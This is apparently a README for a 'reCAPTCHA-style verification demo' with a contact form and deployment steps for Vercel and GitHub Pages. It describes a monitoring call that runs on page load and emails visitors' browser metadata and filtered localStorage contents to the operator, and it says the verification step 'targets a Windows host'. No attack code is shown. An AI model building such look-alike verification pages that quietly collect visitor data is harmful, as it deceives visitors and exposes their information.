# V-job

This project is a reCAPTCHA-style verification demo with a server-backed contact form.

## What was prepared for hosting

- Added the root entry page at [index.html](index.html).
- Added [404.html](404.html) for friendly fallback routing on static hosts.
- Added [.nojekyll](.nojekyll) so GitHub Pages serves the site without Jekyll processing.
- Kept the verification assets under [assets](assets) so they resolve from the repository root.
- Added [api/send-email.js](api/send-email.js), a Vercel serverless endpoint that sends contact messages through Resend.
- Added verification monitoring through the same endpoint. It sends basic session and browser metadata plus filtered key/value pairs from this application's own localStorage. The client and server exclude entries whose keys or values look like authentication credentials, access tokens, passwords, payment information, or other secrets. No sessionStorage, cookies, files, or cross-origin data are accessed.

## Preview locally

Run a simple local server from the repository root:

```bash
python3 -m http.server 8000
```

Then open:

- http://127.0.0.1:8000/

## Deploy to Vercel

Deploy the repository as a Vercel project and add these environment variables in the project settings:

```text
RESEND_API_KEY
REPORT_TO_EMAIL
REPORT_FROM_EMAIL
```

`RESEND_API_KEY` is read only by the server-side function and must never be added to browser JavaScript. `REPORT_FROM_EMAIL` must use a sender domain verified in Resend. The contact endpoint is not available on GitHub Pages because GitHub Pages serves static files only.

The monitoring request is best-effort and does not block page use. It runs on page load and requires the Vercel serverless endpoint, so it is unavailable on GitHub Pages. Keep the monitoring disclosure in the verification UI current with the fields sent by the client and derived by the server. Browser APIs may omit fields depending on the device, browser, or permission settings.

## Deploy to GitHub Pages

1. Push this repository to GitHub.
2. Open the repository settings.
3. Navigate to Pages.
4. Choose the branch and root folder (for example, root or main).
5. Save the settings.

The site should be available at:

```text
https://<your-username>.github.io/<repo-name>/
```

## Notes

The page uses a static HTML/CSS/JS structure. The interactive behavior is designed for a browser environment, while the verification step targets a Windows host.
